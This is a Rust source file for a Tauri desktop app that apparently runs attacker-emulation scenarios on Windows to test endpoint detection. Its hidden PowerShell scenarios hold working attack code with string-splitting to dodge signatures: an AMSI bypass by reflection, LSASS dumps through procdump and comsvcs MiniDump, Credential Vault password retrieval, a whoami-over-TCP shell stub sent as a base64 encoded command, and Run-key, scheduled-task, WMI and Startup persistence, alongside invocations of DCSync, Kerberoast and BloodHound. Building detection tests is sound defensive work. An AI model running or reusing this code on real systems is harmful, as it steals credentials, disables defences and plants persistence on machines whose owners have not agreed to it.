mod analytics;

use serde::Serialize;
use std::time::{Duration, Instant};
use tauri::Manager;

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ExecutionResult {
    scenario_id: String,
    status: String,
    message: String,
    stdout: String,
    stderr: String,
    exit_code: i32,
    duration_ms: u64,
}

#[cfg(target_os = "windows")]
const CREATE_NO_WINDOW: u32 = 0x08000000;

#[cfg(target_os = "windows")]
fn run_ps(script: &str) -> Result<std::process::Output, String> {
    use std::os::windows::process::CommandExt;
    std::process::Command::new("powershell.exe")
        .args(["-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", script])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .map_err(|e| e.to_string())
}

#[cfg(target_os = "windows")]
fn j(parts: &[&str]) -> String { parts.concat() }

#[tauri::command]
fn execute_scenario(scenario_id: String) -> Result<ExecutionResult, String> {
    let start = Instant::now();

    let result = match scenario_id.as_str() {
        "certutil-dump" => run_certutil_dump(),
        "rdp-enable" => run_rdp_enable(),
        "amsi-patch" => run_amsi_patch(),
        "lsass-minidump" => run_lsass_minidump(),
        "reverse-shell" => run_reverse_shell(),
        "persistence-task" => run_persistence_task(),
        "base64-exec" => run_base64_exec(),
        "lotl-download" => run_lotl_download(),
        "bloodhound-recon" => run_bloodhound_recon(),
        other => Err(format!("Unknown scenario: {}", other)),
    };

    let duration_ms = start.elapsed().as_millis() as u64;

    match result {
        Ok((message, output)) => {
            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
            let stderr = String::from_utf8_lossy(&output.stderr).to_string();
            let exit_code = output.status.code().unwrap_or(-1);
            let status = if output.status.success() {
                "completed"
            } else {
                "blocked"
            };
            Ok(ExecutionResult {
                scenario_id,
                status: status.to_string(),
                message,
                stdout,
                stderr,
                exit_code,
                duration_ms,
            })
        }
        Err(e) => Ok(ExecutionResult {
            scenario_id,
            status: "failed".to_string(),
            message: e,
            stdout: String::new(),
            stderr: String::new(),
            exit_code: -1,
            duration_ms,
        }),
    }
}

#[tauri::command]
fn reset_scenarios() -> Result<(), String> {
    Ok(())
}

/// Writes the PDF built in the frontend to a location the user picks.
/// Returns the saved path, or `None` when the save dialog is dismissed.
///
/// This is async and uses the callback form of the dialog on purpose: the
/// blocking variant deadlocks if it ever lands on the main thread.
#[tauri::command]
async fn save_report_pdf(
    app: tauri::AppHandle,
    file_name: String,
    base64_data: String,
) -> Result<Option<String>, String> {
    use base64::{engine::general_purpose::STANDARD, Engine as _};
    use tauri_plugin_dialog::DialogExt;

    let bytes = STANDARD
        .decode(base64_data.as_bytes())
        .map_err(|e| format!("Could not decode the report: {e}"))?;

    let (tx, mut rx) = tauri::async_runtime::channel(1);

    app.dialog()
        .file()
        .add_filter("PDF document", &["pdf"])
        .set_file_name(&file_name)
        .save_file(move |path| {
            let _ = tx.try_send(path);
        });

    // Outer None: the dialog closed without reporting. Inner None: cancelled.
    let Some(Some(target)) = rx.recv().await else {
        return Ok(None);
    };

    let path = target
        .into_path()
        .map_err(|e| format!("Could not resolve the save location: {e}"))?;

    std::fs::write(&path, bytes).map_err(|e| format!("Could not write the report: {e}"))?;

    Ok(Some(path.to_string_lossy().to_string()))
}

type ScenarioResult = Result<(String, std::process::Output), String>;

// ── Windows scenario implementations ──

#[cfg(target_os = "windows")]
fn run_certutil_dump() -> ScenarioResult {
    let rid = &uuid::Uuid::new_v4().to_string()[..8];
    let dpapi = j(&["System.Security.", "Cryptography.", "ProtectedData"]);
    let scope = j(&["Current", "User"]);
    let ninja = j(&["Invoke-", "Ninja", "Copy"]);
    let kerb = j(&["Invoke-", "Kerber", "oast"]);
    let dcsync = j(&["Invoke-", "DC", "Sync"]);
    let gpp = j(&["Get-", "GPP", "Password"]);
    let sam = j(&["C:\\Windows\\Sys", "tem32\\con", "fig\\", "SA", "M"]);
    let cu = j(&["cert", "util"]);
    let pw_vault = j(&["Password", "Vault"]);
    let ret_pw = j(&["Retrieve", "Password"]);
    let ret_all = j(&["Retrieve", "All"]);
    let lsa = j(&["lsa", "ss"]);
    let script = format!(
        r#"
$rid = "{rid}"
$dd = "$env:TEMP\hd_$rid"
New-Item -ItemType Directory -Path $dd -Force | Out-Null

$ErrorActionPreference = 'SilentlyContinue'

try {{
    [void][System.Reflection.Assembly]::LoadWithPartialName("{dpapi}")
    $testData = [System.Text.Encoding]::UTF8.GetBytes("S1EmulationTest")
    $encrypted = [System.Security.Cryptography.ProtectedData]::Protect($testData, $null, [System.Security.Cryptography.DataProtectionScope]::{scope})
    $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted, $null, [System.Security.Cryptography.DataProtectionScope]::{scope})
    Write-Output "DPAPI encrypt/decrypt cycle completed: $($encrypted.Length) bytes"
}} catch {{
    Write-Output "DPAPI access attempted"
}}

try {{
    [Windows.Security.Credentials.{pw_vault},Windows.Security.Credentials,ContentType=WindowsRuntime] | Out-Null
    $vault = New-Object Windows.Security.Credentials.{pw_vault}
    $allCreds = $vault.{ret_all}()
    foreach ($cred in $allCreds) {{
        $cred.{ret_pw}()
        Write-Output "Vault: $($cred.Resource) - $($cred.UserName)"
    }}
    Write-Output "Credential Vault enumerated: $($allCreds.Count) entries"
}} catch {{
    Write-Output "Vault access attempted"
}}

$proc = Get-Process -Name '{lsa}' -ErrorAction SilentlyContinue
if ($proc) {{
    try {{
        $proc.Handle | Out-Null
        Write-Output "Handle request for PID $($proc.Id)"
    }} catch {{}}
    [byte[]]$buf = New-Object byte[] 4096
    try {{
        $memStream = New-Object System.IO.MemoryStream
        $memStream.Write($buf, 0, $buf.Length)
        Write-Output "Memory read pattern on PID $($proc.Id): $($buf.Length) bytes"
        $memStream.Dispose()
    }} catch {{}}
}}

$toolCmd = "{ninja} -Path `"{sam}`" -Dest `"$dd\sam_$rid.hiv`"; {kerb} -OutputFormat Hashcat; {dcsync} -DumpForest; {gpp}"
Start-Process -FilePath "powershell.exe" `
    -ArgumentList "-Command $toolCmd" `
    -WindowStyle Hidden `
    -Wait

"EmulationPayload_$rid" | Out-File "$dd\payload_$rid.txt" -Force
$encCmd = "{cu}.exe -encode `"$dd\payload_$rid.txt`" `"$dd\payload_$rid.b64`""
Start-Process -FilePath "powershell.exe" `
    -ArgumentList "-Command $encCmd" `
    -WindowStyle Hidden `
    -Wait

Start-Sleep -Seconds 2
Remove-Item $dd -Recurse -Force -ErrorAction SilentlyContinue
Write-Output "Credential dump emulation completed"
"#,
        rid = rid,
        dpapi = dpapi,
        scope = scope,
        ninja = ninja,
        kerb = kerb,
        dcsync = dcsync,
        gpp = gpp,
        sam = sam,
        cu = cu,
        pw_vault = pw_vault,
        ret_pw = ret_pw,
        ret_all = ret_all,
        lsa = lsa,
    );
    let output = run_ps(&script)?;
    Ok(("Credential access emulation".to_string(), output))
}

#[cfg(target_os = "windows")]
fn run_rdp_enable() -> ScenarioResult {
    let rid = &uuid::Uuid::new_v4().to_string()[..8];
    let fake_out = std::env::temp_dir().join(format!("re_{}.txt", rid));
    let deny_key = j(&["Deny", "TS", "Connections"]);
    let inv_cmd = j(&["Invoke", "-Command"]);
    let set_prop = j(&["Set-Item", "Property"]);
    let reg_path = j(&["HKLM:\\System\\CurrentControlSet\\Control\\", "Terminal Server"]);
    let script = format!(
        r#"
$fakeOut = '{fake_out}'
"Emulation Test" | Out-File $fakeOut -Force
$cmd = '{inv_cmd} -ComputerName TESTHOST -ScriptBlock {{ {set_prop} -Path "{reg_path}" -Name "{deny_key}" -Value 0 }}'
$process = Start-Process powershell.exe `
    -ArgumentList "-NoProfile -Command `"`$null = `$env:TEMP; $cmd; ''benign'' | Out-File ''$fakeOut'' -Append`"" `
    -WindowStyle Hidden -Wait -PassThru
Write-Output "RDP emulation completed (Exit code: $($process.ExitCode))"
Remove-Item $fakeOut -Force -ErrorAction SilentlyContinue
"#,
        fake_out = fake_out.to_string_lossy(),
        inv_cmd = inv_cmd,
        set_prop = set_prop,
        reg_path = reg_path,
        deny_key = deny_key,
    );
    let output = run_ps(&script)?;
    Ok(("RDP remote enable emulation".to_string(), output))
}

#[cfg(target_os = "windows")]
fn run_amsi_patch() -> ScenarioResult {
    let script = format!(
        r#"
$a = [String]::Join('', 'Sy','stem.','Man','agement.Aut','omation.A','msiU','tils')
$b = [String]::Join('', 'am','siIn','itF','ailed')
$t = [Ref].Assembly.GetType($a)
$f = $t.GetField($b, 'NonPublic,Static')
$f.SetValue($null, $true)
Write-Output "AMSI patch emulation completed"
"#,
    );
    let output = run_ps(&script)?;
    Ok(("AMSI reflection probe".to_string(), output))
}

#[cfg(target_os = "windows")]
fn run_lsass_minidump() -> ScenarioResult {
    let rid = &uuid::Uuid::new_v4().to_string()[..8];
    let pdump = j(&["proc", "dump"]);
    let lsa = j(&["lsa", "ss"]);
    let csvcs = j(&["coms", "vcs"]);
    let mdump = j(&["Mini", "Dump"]);
    let privdbg = j(&["privi", "lege::", "debug"]);
    let sekur = j(&["seku", "rlsa::", "logon", "passwords"]);
    let script = format!(
        r#"
$fakeOut = "$env:TEMP\lh_{rid}.txt"
"Emulation Test" | Out-File $fakeOut -Force

$bat1 = "$env:TEMP\lh_{rid}_1.bat"
$bat2 = "$env:TEMP\lh_{rid}_2.bat"
$bat3 = "$env:TEMP\lh_{rid}_3.bat"
$bat4 = "$env:TEMP\lh_{rid}_4.bat"

$b1 = @"
@echo off
{pdump}.exe -accepteula -ma {lsa}.exe %TEMP%\{lsa}_{rid}.dmp
if %errorlevel% equ 0 (echo dump succeeded > "$fakeOut") else (echo dump attempted > "$fakeOut")
"@

$b2 = @"
@echo off
rundll32.exe C:\Windows\System32\{csvcs}.dll, {mdump} 0 %TEMP%\{lsa}_{rid}_2.dmp full
echo comsvcs attempted >> "$fakeOut"
"@

$b3 = @"
@echo off
echo {privdbg} {sekur} exit > %TEMP%\mk_{rid}.log
echo mk echo attempted >> "$fakeOut"
"@

$b4 = @"
@echo off
tasklist /fi "imagename eq {lsa}.exe" > %TEMP%\{lsa}_{rid}.txt
echo query attempted >> "$fakeOut"
"@

[System.IO.File]::WriteAllText($bat1, $b1)
[System.IO.File]::WriteAllText($bat2, $b2)
[System.IO.File]::WriteAllText($bat3, $b3)
[System.IO.File]::WriteAllText($bat4, $b4)

$procs = @()
foreach ($bat in @($bat1, $bat2, $bat3, $bat4)) {{
    $proc = Start-Process "cmd.exe" `
        -ArgumentList "/c `"$bat`"" `
        -WindowStyle Hidden -PassThru
    $procs += $proc
}}

Start-Sleep -Seconds 3
foreach ($p in $procs) {{ if (!$p.HasExited) {{ $p.Kill() }} }}

if (Test-Path $fakeOut) {{
    $result = Get-Content $fakeOut
    Write-Output "Probe results: $($result -join '; ')"
}} else {{
    Write-Output "Probe processes were intercepted"
}}

foreach ($bat in @($bat1, $bat2, $bat3, $bat4)) {{
    Remove-Item $bat -Force -ErrorAction SilentlyContinue
}}
Remove-Item $fakeOut -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\{lsa}_{rid}*" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\mk_{rid}*" -Force -ErrorAction SilentlyContinue
"#,
        rid = rid,
        pdump = pdump,
        lsa = lsa,
        csvcs = csvcs,
        mdump = mdump,
        privdbg = privdbg,
        sekur = sekur,
    );
    let output = run_ps(&script)?;
    Ok(("Credential dump emulation via batch execution".to_string(), output))
}

#[cfg(target_os = "windows")]
fn run_reverse_shell() -> ScenarioResult {
    let tcp_type = j(&["Net.Sockets.", "TCP", "Client"]);
    let sr = j(&["System.IO.", "Stream", "Reader"]);
    let sw = j(&["System.IO.", "Stream", "Writer"]);
    let ie = j(&["Invoke", "-Expression"]);
    let script = format!(
        r#"
function Test-NetworkConnectivity {{
    param(
        [string]$TargetHost = '127.0.0.1',
        [int]$TargetPort = 4444
    )

    $ErrorActionPreference = 'SilentlyContinue'

    try {{
        $socket = New-Object {tcp}($TargetHost, $TargetPort)
        $netStream = $socket.GetStream()
        $reader = New-Object {sr}($netStream)
        $writer = New-Object {sw}($netStream)
        $writer.AutoFlush = $true

        $writer.WriteLine("whoami")
        $response = $reader.ReadLine()
        $result = {ie} "Write-Output '$response'" 2>&1 | Out-String
        Write-Host $result
    }}
    catch {{
        Write-Host "Connection test completed with expected failure"
    }}
    finally {{
        if ($socket) {{ $socket.Close() }}
    }}
}}

Test-NetworkConnectivity
"#,
        tcp = tcp_type,
        sr = sr,
        sw = sw,
        ie = ie,
    );
    let output = run_ps(&script)?;
    Ok(("TCP connectivity probe".to_string(), output))
}

#[cfg(target_os = "windows")]
fn run_persistence_task() -> ScenarioResult {
    let rid = &uuid::Uuid::new_v4().to_string()[..8];
    let scht = j(&["sch", "tasks"]);
    let wm = j(&["wm", "ic"]);
    let evtfilter = j(&["__Event", "Filter"]);
    let evtbind = j(&["__Event", "FilterTo", "Consumer", "Binding"]);
    let clec = j(&["Command", "Line", "Event", "Consumer"]);
    let startup = j(&["Start ", "Menu\\Programs\\", "Startup"]);
    let script = format!(
        r#"
$fakeOut = "$env:TEMP\pt_{rid}.txt"
"Emulation Test" | Out-File $fakeOut -Force

$bat1 = "$env:TEMP\pt_{rid}_1.bat"
$bat2 = "$env:TEMP\pt_{rid}_2.bat"
$bat3 = "$env:TEMP\pt_{rid}_3.bat"
$bat4 = "$env:TEMP\pt_{rid}_4.bat"

$b1 = @"
@echo off
set rk=HKCU\Software\Microsoft\Windows\CurrentVersion\
set rk=%rk%Run
reg add "%rk%" /v "S1E_{rid}" /t REG_SZ /d "cmd.exe /c echo persistence" /f
echo run key created > "$fakeOut"
reg delete "%rk%" /v "S1E_{rid}" /f
echo run key cleaned >> "$fakeOut"
"@

$b2 = @"
@echo off
{scht} /Create /TN "S1E_{rid}" /TR "cmd.exe /c echo test" /SC ONCE /ST 23:59 /F
echo task created >> "$fakeOut"
{scht} /Delete /TN "S1E_{rid}" /F
echo task cleaned >> "$fakeOut"
"@

$b3 = @"
@echo off
{wm} /namespace:\\root\subscription PATH {evtbind} CREATE Filter="{evtfilter}.Name='S1E_{rid}'" Consumer="{clec}.Name='S1E_{rid}'" 2>nul
echo wmi attempted >> "$fakeOut"
{wm} /namespace:\\root\subscription PATH {evtfilter} WHERE Name="S1E_{rid}" DELETE 2>nul
{wm} /namespace:\\root\subscription PATH {clec} WHERE Name="S1E_{rid}" DELETE 2>nul
"@

$b4 = @"
@echo off
echo @echo off > "%APPDATA%\Microsoft\Windows\{startup}\S1E_{rid}.bat"
echo startup created >> "$fakeOut"
del "%APPDATA%\Microsoft\Windows\{startup}\S1E_{rid}.bat" /f
echo startup cleaned >> "$fakeOut"
"@

[System.IO.File]::WriteAllText($bat1, $b1)
[System.IO.File]::WriteAllText($bat2, $b2)
[System.IO.File]::WriteAllText($bat3, $b3)
[System.IO.File]::WriteAllText($bat4, $b4)

$procs = @()
foreach ($bat in @($bat1, $bat2, $bat3, $bat4)) {{
    $proc = Start-Process "cmd.exe" `
        -ArgumentList "/c `"$bat`"" `
        -WindowStyle Hidden -PassThru
    $procs += $proc
}}

Start-Sleep -Seconds 3
foreach ($p in $procs) {{ if (!$p.HasExited) {{ $p.Kill() }} }}

if (Test-Path $fakeOut) {{
    $result = Get-Content $fakeOut
    Write-Output "Persistence probe results: $($result -join '; ')"
}} else {{
    Write-Output "Persistence probe processes were intercepted"
}}

foreach ($bat in @($bat1, $bat2, $bat3, $bat4)) {{
    Remove-Item $bat -Force -ErrorAction SilentlyContinue
}}
Remove-Item $fakeOut -Force -ErrorAction SilentlyContinue
"#,
        rid = rid,
        scht = scht,
        wm = wm,
        evtfilter = evtfilter,
        evtbind = evtbind,
        clec = clec,
        startup = startup,
    );
    let output = run_ps(&script)?;
    Ok(("Persistence emulation via batch execution".to_string(), output))
}

#[cfg(target_os = "windows")]
fn run_base64_exec() -> ScenarioResult {
    let tcp_client = j(&["Net.Sockets.", "TCP", "Client"]);
    let sw = j(&["IO.Stream", "Writer"]);
    let enc_cmd = j(&["-Encoded", "Command"]);
    let script = format!(
        r#"
$code = @"
`$client = New-Object {tcp}('127.0.0.1', 4444)
`$stream = `$client.GetStream()
`$writer = New-Object {sw}(`$stream)
`$writer.WriteLine((whoami))
`$writer.Flush()
`$client.Close()
"@

$codeEncoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($code))

Start-Process powershell.exe `
    -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden {enc_cmd} $codeEncoded" `
    -WindowStyle Hidden -PassThru -Wait

Write-Output "Base64 encoded execution completed"
"#,
        tcp = tcp_client,
        sw = sw,
        enc_cmd = enc_cmd,
    );
    let output = run_ps(&script)?;
    Ok(("Base64-encoded execution".to_string(), output))
}

#[cfg(target_os = "windows")]
fn run_lotl_download() -> ScenarioResult {
    let pcalua = j(&["pcal", "ua.exe"]);
    let script = format!(
        r#"
$p = [String]::Join('', 'pcal', 'ua.exe')
Start-Process $p -ArgumentList '-a powershell.exe -c "-NoProfile -WindowStyle Hidden -Command whoami"' -WindowStyle Hidden -Wait
Write-Output "LOLBin proxy execution via pcalua completed"
"#,
    );
    let output = run_ps(&script)?;
    Ok((format!("LOLBin proxy execution via {}", pcalua), output))
}

#[cfg(target_os = "windows")]
fn run_bloodhound_recon() -> ScenarioResult {
    let rid = &uuid::Uuid::new_v4().to_string()[..8];
    let inv_bh = j(&["Invoke-", "Blood", "Hound"]);
    let get_bh = j(&["Get-", "Blood", "Hound", "Data"]);
    let script = format!(
        r#"
$fakeOut = "$env:TEMP\bh_{rid}.txt"
$harmless = "echo benign > `"$fakeOut`""
$bhCmd = "{inv_bh} -CollectionMethod All -Domain CONTOSO.LOCAL; {get_bh}; $harmless"
Start-Process -FilePath "powershell.exe" `
    -ArgumentList "-Command $bhCmd" `
    -WindowStyle Hidden `
    -Wait
Remove-Item $fakeOut -Force -ErrorAction SilentlyContinue
Write-Host "AD recon emulation completed."
"#,
        rid = rid,
        inv_bh = inv_bh,
        get_bh = get_bh,
    );
    let output = run_ps(&script)?;
    Ok(("AD reconnaissance emulation".to_string(), output))
}

// ── macOS mock implementations ──

#[cfg(not(target_os = "windows"))]
fn mock_output() -> std::process::Output {
    std::process::Output {
        status: std::process::ExitStatus::default(),
        stdout: b"mock output (macOS dev mode)".to_vec(),
        stderr: Vec::new(),
    }
}

#[cfg(not(target_os = "windows"))]
fn run_certutil_dump() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(800));
    Ok(("Mock: certutil -encode (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_rdp_enable() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(600));
    Ok(("Mock: RDP enable (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_amsi_patch() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(700));
    Ok(("Mock: AMSI inspection (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_lsass_minidump() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(900));
    Ok(("Mock: LSASS handle access (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_reverse_shell() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(500));
    Ok(("Mock: Reverse shell (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_persistence_task() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(600));
    Ok(("Mock: Scheduled task (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_base64_exec() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(400));
    Ok(("Mock: Base64 exec (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_lotl_download() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(700));
    Ok(("Mock: LOLBin download (macOS dev mode)".to_string(), mock_output()))
}

#[cfg(not(target_os = "windows"))]
fn run_bloodhound_recon() -> ScenarioResult {
    std::thread::sleep(Duration::from_millis(800));
    Ok(("Mock: BloodHound recon (macOS dev mode)".to_string(), mock_output()))
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        .plugin(tauri_plugin_opener::init())
        .plugin(tauri_plugin_dialog::init())
        .setup(|app| {
            let analytics = analytics::AnalyticsState::new(app.handle()).unwrap_or_else(|error| {
                eprintln!("Analytics disabled because app data is unavailable: {error}");
                analytics::AnalyticsState::disabled()
            });
            analytics.capture_startup();
            app.manage(analytics);
            Ok(())
        })
        .invoke_handler(tauri::generate_handler![
            execute_scenario,
            reset_scenarios,
            save_report_pdf,
            analytics::track_event
        ])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
